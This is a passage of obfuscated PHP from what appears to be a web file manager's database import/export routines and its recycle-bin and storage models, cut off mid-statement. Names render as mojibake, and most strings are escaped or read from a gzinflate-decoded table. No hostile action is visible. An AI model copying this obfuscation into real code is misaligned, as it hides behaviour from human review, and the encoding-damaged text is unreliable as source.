$Ã’¹™ÚŸ += $×ß“ğ‚Ğ; if ($ö¿ßáæö) { $ö¿ßáæö->update($×ß“ğ‚Ğ); } } while ($Å±÷ª ó == $×ß“ğ‚Ğ); fclose($ŸÑÀäÛ); return $Ã’¹™ÚŸ; } public function sqlToDb($Ù„Ä•–”, &$º¨•¤ä¦) { $Ëº¢ï— =& $_SERVER[å¸¿•¶£]; $Ì£Õ‹¡¯ = $this->model()->db(); $é¦‘Àûü = @fopen($Ù„Ä•–”, $Ëº¢ï—[1084]); if (!$é¦‘Àûü) { return !1; } $µüôı·Ã = 0; $Ù«Šµ = $Ëº¢ï—[12]; $°ÔŞ©ƒ = array(); $™ø¢ˆ°Æ = $this->dbType(); $ÊÆô‹ã = $™ø¢ˆ°Æ == $Ëº¢ï—[13] ? 500 : 2000; $å†²Ç = basename($Ù„Ä•–”, $Ëº¢ï—[795]); $¯å÷óèı = 0; $¥ù¼Şä— = 4194304 - 104858; $Êš‡ªô» = 1000000 - 104858; while (!feof($é¦‘Àûü)) { $•¯šôÉœ = trim(fgets($é¦‘Àûü)); if (!$•¯šôÉœ) { continue; } $Ã±ì—Í‰ = $this->sqlDecode($•¯šôÉœ, $™ø¢ˆ°Æ, $å†²Ç); if (stripos($Ã±ì—Í‰, $Ëº¢ï—[355]) === 0) { if (!$Ù«Šµ) { $Ù«Šµ = $Ã±ì—Í‰ . $Ëº¢ï—[53]; } continue; } if ($º¨•¤ä¦) { $º¨•¤ä¦->task[$Ëº¢ï—[793]] += 1; } $µüôı·Ã++; $°ÔŞ©ƒ[] = rtrim(rtrim(trim($Ã±ì—Í‰), $Ëº¢ï—[50]), $Ëº¢ï—[71]); $‰»’Ñı­ = null; $’Äş• = strlen($Ã±ì—Í‰); $¯å÷óèı += $’Äş•; if ($¯å÷óèı >= ($ÊÆô‹ã == 500 ? $Êš‡ªô» : $¥ù¼Şä—)) { $‰»’Ñı­ = array_pop($°ÔŞ©ƒ); if ($µüôı·Ã > 1) { $µüôı·Ã--; } } if ($µüôı·Ã >= $ÊÆô‹ã || $‰»’Ñı­) { $Ã±ì—Í‰ = $Ù«Šµ . implode($Ëº¢ï—[50], $°ÔŞ©ƒ); if (!$Ì£Õ‹¡¯->execute($Ã±ì—Í‰)) { return !1; } if ($º¨•¤ä¦) { $º¨•¤ä¦->update($µüôı·Ã); } $°ÔŞ©ƒ = array(); $µüôı·Ã = 0; $¯å÷óèı = 0; if ($‰»’Ñı­) { $°ÔŞ©ƒ = array($‰»’Ñı­); $µüôı·Ã = 1; $¯å÷óèı = $’Äş•; } } } fclose($é¦‘Àûü); if (!empty($°ÔŞ©ƒ)) { $Ã±ì—Í‰ = $Ù«Šµ . implode($Ëº¢ï—[50], $°ÔŞ©ƒ); if (!$Ì£Õ‹¡¯->execute($Ã±ì—Í‰)) { return !1; } if ($º¨•¤ä¦) { $º¨•¤ä¦->update($µüôı·Ã); } } return !0; } public function dropTable($³ß¢È‚è = null) { $¹Ü÷ö¶ = $this->model()->db(); $¦¡ı˜—ı = $³ß¢È‚è ? array($³ß¢È‚è) : $¹Ü÷ö¶->getTables(); if (!$¦¡ı˜—ı) { return; } foreach ($¦¡ı˜—ı as $³ß¢È‚è) { if ($³ß¢È‚è) { $³ß¢È‚è = strtolower($³ß¢È‚è); } else { continue; } $¹Ü÷ö¶->execute("\144\x72\157\160\40\164\141\x62\154\x65\40\x69\x66\x20\145\170\x69\163\164\x73\x20\x60{$³ß¢È‚è}\140"); } } private function sqlEncode($½·ü£å) { $ÈñÛÚ›á =& $_SERVER[å¸¿•¶£]; $ñ¦­æŸœ = array(); foreach ($½·ü£å as $òÌúó¶‚) { if (is_array($òÌúó¶‚)) { $òÌúó¶‚ = json_encode_force($òÌúó¶‚); } $òÌúó¶‚ = addslashes($òÌúó¶‚); $òÌúó¶‚ = str_replace(array($ÈñÛÚ›á[1085], $ÈñÛÚ›á[231]), array($ÈñÛÚ›á[1086], $ÈñÛÚ›á[1087]), $òÌúó¶‚); $ñ¦­æŸœ[] = str_replace($ÈñÛÚ›á[58], $ÈñÛÚ›á[1088], $òÌúó¶‚); } return $ÈñÛÚ›á[58] . implode($ÈñÛÚ›á[1089], $ñ¦­æŸœ) . $ÈñÛÚ›á[58]; } private function sqlDecode($Ü½øŸ£, $†·éÛ­ì, $İñª†¬ = '') { $¼¬Ã“½» =& $_SERVER[å¸¿•¶£]; $Ü½øŸ£ = str_replace(array($¼¬Ã“½»[1086], $¼¬Ã“½»[1087]), array($¼¬Ã“½»[1085], $¼¬Ã“½»[231]), $Ü½øŸ£); if ($†·éÛ­ì == $¼¬Ã“½»[13]) { return $İñª†¬ != $¼¬Ã“½»[1090] ? stripslashes($Ü½øŸ£) : $Ü½øŸ£; } if ($İñª†¬ == $¼¬Ã“½»[1090]) { $Ü½øŸ£ = str_replace($¼¬Ã“½»[1091], $¼¬Ã“½»[118], stripslashes($Ü½øŸ£)); } return $Ü½øŸ£; } public function getSqlFile($Õóü„” = '') { $ªÄËù” =& $_SERVER[å¸¿•¶£]; $¼§¶¯Å = $this->dbType(!0); $÷¡ûóÎ” = CONTROLLER_DIR . "\x69\x6e\163\164\x61\154\154\57\x64\141\x74\x61\x2f{$¼§¶¯Å}\56\163\161\x6c"; $ÌšÜ’šÈ = file_get_contents($÷¡ûóÎ”); $šòÉí®Ç = $ªÄËù”[1092] . ($¼§¶¯Å == $ªÄËù”[811] ? $ªÄËù”[1093] : $ªÄËù”[1094]) . $ªÄËù”[1095]; preg_match_all($šòÉí®Ç, $ÌšÜ’šÈ, $©Òº´÷); $‚ƒ°ÆüÊ = $©Òº´÷[1]; $†ùÀú¤´ = $this->model()->db(); $¹àËîå¢ = $†ùÀú¤´->getTables(); $èªèÉ = TEMP_FILES . $ªÄËù”[1096] . date($ªÄËù”[757]) . $ªÄËù”[8]; del_dir($èªèÉ); mk_dir($èªèÉ); $Û¿ŞÛˆü = $èªèÉ . $ªÄËù”[1097]; $Øšœ¥ôä = $èªèÉ . $ªÄËù”[1098]; $‘šÊü· = $¼§¶¯Å == $ªÄËù”[13] ? $ªÄËù”[811] : $ªÄËù”[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\141\x6c\x6c\57\144\141\164\x61\57{$‘šÊü·}\56\x73\x71\x6c", $èªèÉ); @touch($èªèÉ . $¼§¶¯Å . $ªÄËù”[795]); $ºÓªŠÉ„ = fopen($Û¿ŞÛˆü, $ªÄËù”[1073]); $â”Ô†² = fopen($Øšœ¥ôä, $ªÄËù”[1073]); if ($¼§¶¯Å == $ªÄËù”[13]) { $¹àËîå¢ = array_diff($¹àËîå¢, array($ªÄËù”[791], $ªÄËù”[792])); $ÍÚâ‚µÈ = array($ªÄËù”[1099], $ªÄËù”[1100], $ªÄËù”[1101]); fwrite($â”Ô†², implode(PHP_EOL, $ÍÚâ‚µÈ) . PHP_EOL . PHP_EOL); foreach ($¹àËîå¢ as $šåã¦Çû) { $Ó‚Ãˆ“ä = $this->sqlFromSqlite($šåã¦Çû); if (!$Ó‚Ãˆ“ä[$ªÄËù”[13]]) { continue; } fwrite($â”Ô†², $Ó‚Ãˆ“ä[$ªÄËù”[13]] . PHP_EOL . PHP_EOL); if (!in_array($šåã¦Çû, $‚ƒ°ÆüÊ)) { fwrite($ºÓªŠÉ„, $Ó‚Ãˆ“ä[$ªÄËù”[811]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¹àËîå¢ as $šåã¦Çû) { $Ó‚Ãˆ“ä = $this->sqlFromMysql($šåã¦Çû); if (!$Ó‚Ãˆ“ä[$ªÄËù”[811]]) { continue; } fwrite($ºÓªŠÉ„, $Ó‚Ãˆ“ä[$ªÄËù”[811]] . PHP_EOL . PHP_EOL); if (!in_array($šåã¦Çû, $‚ƒ°ÆüÊ)) { fwrite($â”Ô†², $Ó‚Ãˆ“ä[$ªÄËù”[13]] . PHP_EOL . PHP_EOL); } } } fclose($ºÓªŠÉ„); fclose($â”Ô†²); $ÌšÜ’šÈ = array($ªÄËù”[811] => $Û¿ŞÛˆü, $ªÄËù”[13] => $Øšœ¥ôä); return $Õóü„” ? $ÌšÜ’šÈ[$Õóü„”] : $ÌšÜ’šÈ; } public function dbType($ÅëŸ°ƒÒ = false) { $ èºÀØó =& $_SERVER[å¸¿•¶£]; $ŸßĞâ³Ï = $ÅëŸ°ƒÒ ? $GLOBALS[$ èºÀØó[6]][$ èºÀØó[21]] : $this->database; $ŸßĞâ³Ï = array_change_key_case($ŸßĞâ³Ï); $‘©·»‘œ = $ŸßĞâ³Ï[$ èºÀØó[974]]; if ($‘©·»‘œ == $ èºÀØó[971]) { $„¤—šöÈ = explode($ èºÀØó[4], $ŸßĞâ³Ï[$ èºÀØó[980]]); $‘©·»‘œ = $„¤—šöÈ[0]; } $şåÓÁ‚ = array($ èºÀØó[1102] => $ èºÀØó[13], $ èºÀØó[919] => $ èºÀØó[811]); if (isset($şåÓÁ‚[$‘©·»‘œ])) { $‘©·»‘œ = $şåÓÁ‚[$‘©·»‘œ]; } return $‘©·»‘œ; } public function sqlFromMysql($é§‰æóİ, $Õ–÷äš = '') { $ª¢·£â =& $_SERVER[å¸¿•¶£]; $‚¥ü©ç = $this->model()->db(); $åø «·¦ = $‚¥ü©ç->query($ª¢·£â[1103] . $é§‰æóİ . $ª¢·£â[385]); if (!$åø «·¦ || !$åø «·¦[0]) { return !1; } $©óõô¤¾ = _get($åø «·¦[0], $ª¢·£â[1104], $ª¢·£â[12]); if (!$©óõô¤¾) { return !1; } $Í¸ºğ‘  = "\x44\122\117\x50\x20\124\x41\x42\114\105\x20\111\106\x20\x45\x58\x49\123\x54\123\40\x60{$é§‰æóİ}\x60\73" . PHP_EOL . $©óõô¤¾ . $ª¢·£â[71]; if ($Õ–÷äš && $Õ–÷äš == $ª¢·£â[811]) { return $Í¸ºğ‘ ; } $ŠÁõÃâ = array_change_key_case($GLOBALS[$ª¢·£â[6]][$ª¢·£â[21]]); $¯×—ïº = $ŠÁõÃâ[$ª¢·£â[979]]; $ ¬İˆû = $ª¢·£â[1105] . $¯×—ïº . $ª¢·£â[1106] . $é§‰æóİ . $ª¢·£â[58]; $ºí¾ƒºá = $ª¢·£â[1107] . $é§‰æóİ . $ª¢·£â[907]; $¼ÇãÎÎò = $‚¥ü©ç->query($ ¬İˆû); if (empty($¼ÇãÎÎò)) { $õİ˜©° = array($ª¢·£â[811] => $ª¢·£â[12], $ª¢·£â[13] => $ª¢·£â[12]); return $Õ–÷äš ? $õİ˜©°[$Õ–÷äš] : $õİ˜©°; } $¦êèø›á = $‚¥ü©ç->query($ºí¾ƒºá); $»ŸÈ­æš = $ª¢·£â[12]; $‘Î’î¦š = array(); foreach ($¦êèø›á as $²ùûÚÈ) { if (!$»ŸÈ­æš && $²ùûÚÈ[$ª¢·£â[1108]] == $ª¢·£â[1109]) { $»ŸÈ­æš = $²ùûÚÈ[$ª¢·£â[1110]]; } if (isset($‘Î’î¦š[$²ùûÚÈ[$ª¢·£â[1108]]])) { $‘Î’î¦š[$²ùûÚÈ[$ª¢·£â[1108]]][$ª¢·£â[1111]][] = $²ùûÚÈ[$ª¢·£â[1110]]; continue; } $‘Î’î¦š[$²ùûÚÈ[$ª¢·£â[1108]]] = array($ª¢·£â[1112] => $²ùûÚÈ[$ª¢·£â[1108]], $ª¢·£â[1111] => array($²ùûÚÈ[$ª¢·£â[1110]]), $ª¢·£â[1113] => $²ùûÚÈ[$ª¢·£â[1114]] == $ª¢·£â[88] ? 0 : 1); } $€«ÍÙìÙ = array(); foreach ($‘Î’î¦š as $²ùûÚÈ) { $¿Å§’ÍÀ = $²ùûÚÈ[$ª¢·£â[1112]] == $ª¢·£â[1109]; $÷ØÌ­ñ = array($ª¢·£â[1115], $²ùûÚÈ[$ª¢·£â[1113]] == $ª¢·£â[88] && !$¿Å§’ÍÀ ? $ª¢·£â[1116] : $ª¢·£â[12], $ª¢·£â[1117], $ª¢·£â[1118] . $é§‰æóİ . $ª¢·£â[11] . ($¿Å§’ÍÀ ? $ª¢·£â[1119] : $²ùûÚÈ[$ª¢·£â[1112]]) . $ª¢·£â[118], $ª¢·£â[1120], $ª¢·£â[118] . $é§‰æóİ . $ª¢·£â[118], $ª¢·£â[1121] . implode($ª¢·£â[1122], $²ùûÚÈ[$ª¢·£â[1111]]) . $ª¢·£â[1123]); $€«ÍÙìÙ[] = implode($ª¢·£â[53], $÷ØÌ­ñ) . $ª¢·£â[71]; } $î˜ıäğÅ = array(); $û×àÙó– = array($ª¢·£â[1124] => $ª¢·£â[1125], $ª¢·£â[1125] => $ª¢·£â[1125], $ª¢·£â[288] => $ª¢·£â[315], $ª¢·£â[287] => $ª¢·£â[315]); foreach ($¼ÇãÎÎò as $²ùûÚÈ) { $÷ØÌ­ñ = array($ª¢·£â[118] . $²ùûÚÈ[$ª¢·£â[1126]] . $ª¢·£â[118], isset($û×àÙó–[$²ùûÚÈ[$ª¢·£â[1127]]]) ? $û×àÙó–[$²ùûÚÈ[$ª¢·£â[1127]]] : $²ùûÚÈ[$ª¢·£â[1128]], $²ùûÚÈ[$ª¢·£â[1129]] == $ª¢·£â[905] ? $ª¢·£â[1130] : $ª¢·£â[1131], $²ùûÚÈ[$ª¢·£â[1126]] == $»ŸÈ­æš ? $ª¢·£â[1132] : $ª¢·£â[12], $²ùûÚÈ[$ª¢·£â[956]] ? strtoupper(str_replace($ª¢·£â[11], $ª¢·£â[12], $²ùûÚÈ[$ª¢·£â[956]])) : $ª¢·£â[12]); $î˜ıäğÅ[] = trim(implode($ª¢·£â[53], $÷ØÌ­ñ)); } $Ë¦ÉÃíù = array($ª¢·£â[1133] . $é§‰æóİ . $ª¢·£â[1134], $ª¢·£â[1135] . $é§‰æóİ . $ª¢·£â[1136], implode($ª¢·£â[50] . PHP_EOL, $î˜ıäğÅ), $ª¢·£â[953]); $ë—®†Åä = implode(PHP_EOL, array_merge($Ë¦ÉÃíù, $€«ÍÙìÙ)); if ($Õ–÷äš && $Õ–÷äš == $ª¢·£â[13]) { return $ë—®†Åä; } $õİ˜©° = array($ª¢·£â[811] => $Í¸ºğ‘ , $ª¢·£â[13] => $ë—®†Åä); return $Õ–÷äš ? $õİ˜©°[$Õ–÷äš] : $õİ˜©°; } public function sqlFromSqlite($ä×ˆİÈ›, $àáÍéÇ = '') { $¬„íò—‘ =& $_SERVER[å¸¿•¶£]; $Áü¼Ï  = $this->model()->db(); $ùÃàçš = "\x50\122\101\107\x4d\101\x20\x54\101\x42\114\105\137\111\116\x46\x4f\40\50\47{$ä×ˆİÈ›}\x27\51"; $ºÛäš“— = "\x53\x45\x4c\x45\x43\124\x20\52\x20\x46\x52\x4f\x4d\40\163\161\x6c\151\x74\145\x5f\x6d\x61\x73\x74\145\162\40\127\110\105\x52\105\40\164\x62\x6c\x5f\156\x61\x6d\145\40\x3d\40\47{$ä×ˆİÈ›}\x27"; $®ñ¼¶†² = $Áü¼Ï ->query($ùÃàçš); if (empty($®ñ¼¶†²)) { $Ş‚şˆçß = array($¬„íò—‘[811] => $¬„íò—‘[12], $¬„íò—‘[13] => $¬„íò—‘[12]); return $àáÍéÇ ? $Ş‚şˆçß[$àáÍéÇ] : $Ş‚şˆçß; } $ëÂÎ•î = $Áü¼Ï ->query($ºÛäš“—); $´Ì•ê¬Ø = $ü†›¦Ó« = array(); foreach ($ëÂÎ•î as $€€Ñ £á) { if ($€€Ñ £á[$¬„íò—‘[33]] == $¬„íò—‘[279]) { $´Ì•ê¬Ø[] = $€€Ñ £á[$¬„íò—‘[1137]]; } else { $ü†›¦Ó«[$€€Ñ £á[$¬„íò—‘[32]]] = $€€Ñ £á[$¬„íò—‘[1137]]; } } $Ç¸ØÂË = array_merge(array($¬„íò—‘[1133] . $ä×ˆİÈ› . $¬„íò—‘[118]), $´Ì•ê¬Ø, array_values($ü†›¦Ó«)); $Ç¸ØÂË = implode($¬„íò—‘[71] . PHP_EOL, $Ç¸ØÂË) . $¬„íò—‘[71]; if ($àáÍéÇ && $àáÍéÇ == $¬„íò—‘[13]) { return $Ç¸ØÂË; } $®€³ƒİ = array(); $şóØ„Î = array($¬„íò—‘[1125] => $¬„íò—‘[1138], $¬„íò—‘[315] => $¬„íò—‘[1139]); $Ñ‚éîÆ = $¬„íò—‘[12]; foreach ($®ñ¼¶†² as $€€Ñ £á) { if ($€€Ñ £á[$¬„íò—‘[57]] == $¬„íò—‘[88]) { $Ñ‚éîÆ = $€€Ñ £á[$¬„íò—‘[32]]; } $ıÏâÛ—Ù = array($¬„íò—‘[385] . $€€Ñ £á[$¬„íò—‘[32]] . $¬„íò—‘[385], isset($şóØ„Î[$€€Ñ £á[$¬„íò—‘[33]]]) ? $şóØ„Î[$€€Ñ £á[$¬„íò—‘[33]]] : $€€Ñ £á[$¬„íò—‘[33]], $€€Ñ £á[$¬„íò—‘[35]] == $¬„íò—‘[88] ? $¬„íò—‘[1130] : $¬„íò—‘[1140] . $€€Ñ £á[$¬„íò—‘[56]], $€€Ñ £á[$¬„íò—‘[57]] == $¬„íò—‘[88] ? $¬„íò—‘[1141] : $¬„íò—‘[12]); $®€³ƒİ[] = trim(implode($¬„íò—‘[53], $ıÏâÛ—Ù)); } foreach ($ü†›¦Ó« as $Ì‡¦”‹ñ => $¸ı÷³ Ù) { $¾¼ëæí = str_replace($¬„íò—‘[1142] . $ä×ˆİÈ› . $¬„íò—‘[11], $¬„íò—‘[12], $Ì‡¦”‹ñ); $Œúğ¸Ÿ­ = str_replace(array($¬„íò—‘[118], $¬„íò—‘[964]), $¬„íò—‘[385], substr($¸ı÷³ Ù, stripos($¸ı÷³ Ù, $¬„íò—‘[260]))); if ($¾¼ëæí == $¬„íò—‘[1119]) { $Ô×¢¥°È = $¬„íò—‘[1143] . $Ñ‚éîÆ . $¬„íò—‘[1144]; } else { $Ô×¢¥°È = (stripos($¾¼ëæí, $¬„íò—‘[11]) ? $¬„íò—‘[1145] : $¬„íò—‘[12]) . ($¬„íò—‘[1146] . $¾¼ëæí . $¬„íò—‘[1147] . $Œúğ¸Ÿ­); } $®€³ƒİ[] = $Ô×¢¥°È; } $ïíÍ…“š = array($¬„íò—‘[1148] . $ä×ˆİÈ› . $¬„íò—‘[1149], $¬„íò—‘[1150] . $ä×ˆİÈ› . $¬„íò—‘[1151], implode($¬„íò—‘[50] . PHP_EOL, $®€³ƒİ), $¬„íò—‘[1152]); $Ò…•åÇŸ = implode(PHP_EOL, $ïíÍ…“š); if ($àáÍéÇ && $àáÍéÇ == $¬„íò—‘[811]) { return $Ò…•åÇŸ; } $Ş‚şˆçß = array($¬„íò—‘[811] => $Ò…•åÇŸ, $¬„íò—‘[13] => $Ç¸ØÂË); return $àáÍéÇ ? $Ş‚şˆçß[$àáÍéÇ] : $Ş‚şˆçß; } } goto a¿‚ã®Ô; aäõö: define($_SERVER[å¸¿•¶£][604], $_SERVER[å¸¿•¶£][605]); $bsnrmwpiuv = $_SERVER[å¸¿•¶£][606]; $_SERVER[•ÅŸñ²ì] = explode($_SERVER[å¸¿•¶£][607], gzinflate(substr($_SERVER[å¸¿•¶£][608], 10, -8))); goto EÆˆ˜ç—¿ô; a‘ÜĞ¦Í‘‡: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\x63\145\x5f\162\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\x54\x69\155\145", "\x74\151\x6d\x65", "\151\156\163\x65\x72\164", "\x66\165\156\143\x74\151\x6f\156")); public function listData($ŸÜ¨™ƒ = false) { $ÆÍãÄ¡› =& $_SERVER[å¸¿•¶£]; $ŸÜ¨™ƒ = $ŸÜ¨™ƒ ? $ŸÜ¨™ƒ : USER_ID; $ë´Ìó†º = $this->where(array($ÆÍãÄ¡›[1665] => $ŸÜ¨™ƒ))->select(); return array_to_keyvalue($ë´Ìó†º, $ÆÍãÄ¡›[12], $ÆÍãÄ¡›[402]); } public function moveToRecycle($¤İã÷‘») { $£‰Çœ„æ =& $_SERVER[å¸¿•¶£]; $äõæ…²… = Model($£‰Çœ„æ[1346]); $û”óğ½ = $äõæ…²…->sourceInfo($¤İã÷‘»); if (!$û”óğ½ || $û”óğ½[$£‰Çœ„æ[431]] == $£‰Çœ„æ[88]) { return; } $³Ğòóø = array($£‰Çœ„æ[417] => $¤İã÷‘», $£‰Çœ„æ[1665] => USER_ID, $£‰Çœ„æ[576] => $û”óğ½[$£‰Çœ„æ[411]], $£‰Çœ„æ[577] => $û”óğ½[$£‰Çœ„æ[496]], $£‰Çœ„æ[580] => $û”óğ½[$£‰Çœ„æ[511]]); $this->add($³Ğòóø); $this->recycleMove($¤İã÷‘», 1); if ($û”óğ½[$£‰Çœ„æ[410]] == $£‰Çœ„æ[88]) { $¼·ß†ß = array($£‰Çœ„æ[580] => array($£‰Çœ„æ[540], $û”óğ½[$£‰Çœ„æ[511]] . $¤İã÷‘» . $£‰Çœ„æ[541])); $äõæ…²…->where($¼·ß†ß)->setField($£‰Çœ„æ[431], 1); } } public function clear() { $this->remove(!1); } public function remove($Óã¶÷úş = false, $Í›ó‚‡ã = false) { $Öíïã˜Ê =& $_SERVER[å¸¿•¶£]; $Í›ó‚‡ã = $Í›ó‚‡ã ? $Í›ó‚‡ã : USER_ID; $ÕüüÏÖş = Model($Öíïã˜Ê[1346]); $ìï“Á²¥ = $this->listData($Í›ó‚‡ã); $Óã¶÷úş = $Óã¶÷úş === !1 ? !1 : $Óã¶÷úş; $ÛúÓÄ½ = array(); foreach ($ìï“Á²¥ as $èôÑí¹õ) { if ($Óã¶÷úş != !1 && !in_array($èôÑí¹õ, $Óã¶÷úş)) { continue; } $×çüÙÜö = $ÕüüÏÖş->sourceInfo($èôÑí¹õ); $ÕüüÏÖş->remove($èôÑí¹õ, !1); $È»ÆÏˆ = $×çüÙÜö[$Öíïã˜Ê[411]] . $Öíïã˜Ê[11] . $×çüÙÜö[$Öíïã˜Ê[496]]; $ÛúÓÄ½[$È»ÆÏˆ] = array($Öíïã˜Ê[576] => $×çüÙÜö[$Öíïã˜Ê[411]], $Öíïã˜Ê[496] => $×çüÙÜö[$Öíïã˜Ê[496]]); $this->where(array($Öíïã˜Ê[402] => $èôÑí¹õ))->delete(); } foreach ($ÛúÓÄ½ as $ö„ø×å“) { $ÕüüÏÖş->targetSpaceUpdate($ö„ø×å“[$Öíïã˜Ê[411]], $ö„ø×å“[$Öíïã˜Ê[496]]); } } public function restore($»”¤Ùİı = false) { $›Ç¼ş¯€ = $this->listData(); $this->_restoreSource($›Ç¼ş¯€, $»”¤Ùİı); } public function removeUserAll($éäíÍ) { $this->remove(!1, $éäíÍ); } private function _restoreSource($Ş×¹ô¨“, $÷½Î×Ä‘) { $ÑˆŒˆ =& $_SERVER[å¸¿•¶£]; $¯üÔ…Î = Model($ÑˆŒˆ[1346]); $÷½Î×Ä‘ = $÷½Î×Ä‘ == !1 ? !1 : $÷½Î×Ä‘; if (!$Ş×¹ô¨“) { return !0; } $ÁƒĞñ›â = array(); foreach ($Ş×¹ô¨“ as $ĞêŸãØğ) { if ($÷½Î×Ä‘ != !1 && !in_array($ĞêŸãØğ, $÷½Î×Ä‘)) { continue; } $›õ¸ÜßÀ = $¯üÔ…Î->sourceInfo($ĞêŸãØğ); $ì¹î­’õ = $¯üÔ…Î->sourceInfo($›õ¸ÜßÀ[$ÑˆŒˆ[432]]); if ($ì¹î­’õ[$ÑˆŒˆ[431]] == $ÑˆŒˆ[88]) { continue; } $¯üÔ…Î->lockMoveStart($ĞêŸãØğ); $this->recycleMove($ĞêŸãØğ, 0); if ($›õ¸ÜßÀ[$ÑˆŒˆ[410]] == $ÑˆŒˆ[88]) { $”ÂÔ´°ç = array($ÑˆŒˆ[580] => array($ÑˆŒˆ[540], $›õ¸ÜßÀ[$ÑˆŒˆ[511]] . $ĞêŸãØğ . $ÑˆŒˆ[541])); $¯üÔ…Î->where($”ÂÔ´°ç)->setField($ÑˆŒˆ[431], 0); $this->restoreFolderChildren($ĞêŸãØğ, $Ş×¹ô¨“); } $this->where(array($ÑˆŒˆ[402] => $ĞêŸãØğ))->delete(); $¯üÔ…Î->folderSizeReset($›õ¸ÜßÀ[$ÑˆŒˆ[432]]); $ÁƒĞñ›â[] = $›õ¸ÜßÀ[$ÑˆŒˆ[432]]; if ($›õ¸ÜßÀ[$ÑˆŒˆ[410]] == $ÑˆŒˆ[88]) { $ÁƒĞñ›â[] = $ĞêŸãØğ; } $¯üÔ…Î->lockMoveEnd($ĞêŸãØğ); } $¯üÔ…Î->updateModifyTime($ÁƒĞñ›â); } private function restoreFolderChildren($œê®®Ş, $Œ­Ô«ß´) { $»‚õœ Ó =& $_SERVER[å¸¿•¶£]; $±‘Ñçßï = Model($»‚õœ Ó[1346]); $ Ù‡Œ°Ã = array($»‚õœ Ó[402] => array($»‚õœ Ó[7], array())); foreach ($Œ­Ô«ß´ as $ú¢ĞÔ™Ã) { if ($ú¢ĞÔ™Ã == $œê®®Ş) { continue; } if (!$±‘Ñçßï->isParentOf($œê®®Ş, $ú¢ĞÔ™Ã)) { continue; } $£Ì³©‹µ = $±‘Ñçßï->sourceInfo($ú¢ĞÔ™Ã); if ($£Ì³©‹µ[$»‚õœ Ó[410]] == $»‚õœ Ó[88]) { $ Ù‡Œ°Ã[] = array($»‚õœ Ó[580] => array($»‚õœ Ó[540], $£Ì³©‹µ[$»‚õœ Ó[511]] . $ú¢ĞÔ™Ã . $»‚õœ Ó[541])); } else { $ Ù‡Œ°Ã[$»‚õœ Ó[402]][1][] = $ú¢ĞÔ™Ã; } } if (!$ Ù‡Œ°Ã[$»‚õœ Ó[402]][1]) { unset($ Ù‡Œ°Ã[$»‚õœ Ó[402]]); } if (!$ Ù‡Œ°Ã) { return; } $ Ù‡Œ°Ã[$»‚õœ Ó[402]][1] = array_unique($ Ù‡Œ°Ã[$»‚õœ Ó[402]][1]); $ Ù‡Œ°Ã[$»‚õœ Ó[1007]] = $»‚õœ Ó[1961]; $±‘Ñçßï->where($ Ù‡Œ°Ã)->setField($»‚õœ Ó[431], 1); } private function recycleMove($‡³¬ÒÜ, $ö„šÔ¨± = 1) { $ÚÃµ¿Ã“ =& $_SERVER[å¸¿•¶£]; $Ğ¬íŒ¾® = Model($ÚÃµ¿Ã“[1346]); $Øúš…‡“ = Model($ÚÃµ¿Ã“[2176]); $±¹Ğã£ğ = array($ÚÃµ¿Ã“[402] => $‡³¬ÒÜ); if ($ö„šÔ¨±) { $Ğ¬íŒ¾®->where($±¹Ğã£ğ)->setField($ÚÃµ¿Ã“[431], 1); $Øúš…‡“->eventRecycle($‡³¬ÒÜ, $ÚÃµ¿Ã“[2177]); } else { $¡¡Ü±ü„ = $Ğ¬íŒ¾®->where($±¹Ğã£ğ)->find(); $è½¬çñÃ = $¡¡Ü±ü„[$ÚÃµ¿Ã“[410]] == $ÚÃµ¿Ã“[88]; $Á°ÒÂÚ† = $Ğ¬íŒ¾®->fileNameAuto($¡¡Ü±ü„[$ÚÃµ¿Ã“[432]], $¡¡Ü±ü„[$ÚÃµ¿Ã“[32]], REPEAT_RENAME_FOLDER, $è½¬çñÃ); if ($Á°ÒÂÚ† != $¡¡Ü±ü„[$ÚÃµ¿Ã“[32]]) { $Ğ¬íŒ¾®->rename($‡³¬ÒÜ, $Á°ÒÂÚ†); } $Ğ¬íŒ¾®->where($±¹Ğã£ğ)->setField($ÚÃµ¿Ã“[431], 0); $Øúš…‡“->eventRecycle($‡³¬ÒÜ, $ÚÃµ¿Ã“[2178]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x73\157\x75\x72\143\145\x53\x65\x63\162\x65\x74\114\x69\x73\164"; public $field = array("\x73\x6f\x75\162\x63\x65\111\x44", "\164\171\160\x65\x49\104", "\143\x72\x65\x61\164\145\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\164\157\162\x61\x67\x65\x4c\151\163\164"; public $field = array("\156\x61\155\x65", "\x73\x69\x7a\145\115\141\170", "\x73\x79\x73\x74\145\x6d", "\x64\x65\146\141\165\154\x74", "\x64\162\x69\x76\145\x72", "\143\157\156\146\151\x67"); public function listData($³ì”‡ø¡ = false, $²¿“»¡ = "\x6d\x6f\144\151\x66\x79\124\151\155\145", $­…ëÀ´Ô = false) { $º¾áîáò =& $_SERVER[å¸¿•¶£]; $ø×°º = parent::listData($³ì”‡ø¡, $²¿“»¡, $­…ëÀ´Ô); if ($³ì”‡ø¡) { return $ø×°º; } $ÈÎ•œ¼ß = $this->ioSizeUseGet(array_to_keyvalue($ø×°º, $º¾áîáò[12], $º¾áîáò[399])); foreach ($ø×°º as $Ó°Å€á => $ÄàûÙ§å) { unset($ø×°º[$Ó°Å€á][$º¾áîáò[6]]); $ø×°º[$Ó°Å€á][$º¾áîáò[1852]] = isset($ÈÎ•œ¼ß[$ÄàûÙ§å[$º¾áîáò[399]]]) ? $ÈÎ•œ¼ß[$ÄàûÙ§å[$º¾áîáò[399]]] : 0; } return $ø×°º; } public function ioSizeUseGet($Ø”“Ãñ‘) { $ÁŞ°Ù×Û =& $_SERVER[å¸¿•¶£]; if (!$Ø”“Ãñ‘) { return array(); } $ïààã‘ = $ÁŞ°Ù×Û[2179] . implode($ÁŞ°Ù×Û[50], $Ø”“Ãñ‘); $ö½™Ø†« = Cache::get($ïààã‘); if ($ö½™Ø†«) { return $ö½™Ø†«; } $Í½ƒ›ğô = array($ÁŞ°Ù×Û[824] => $ÁŞ°Ù×Û[399], $ÁŞ°Ù×Û[2180] => $ÁŞ°Ù×Û[76]); $¶ÔŸôÏã = array($ÁŞ°Ù×Û[824] => 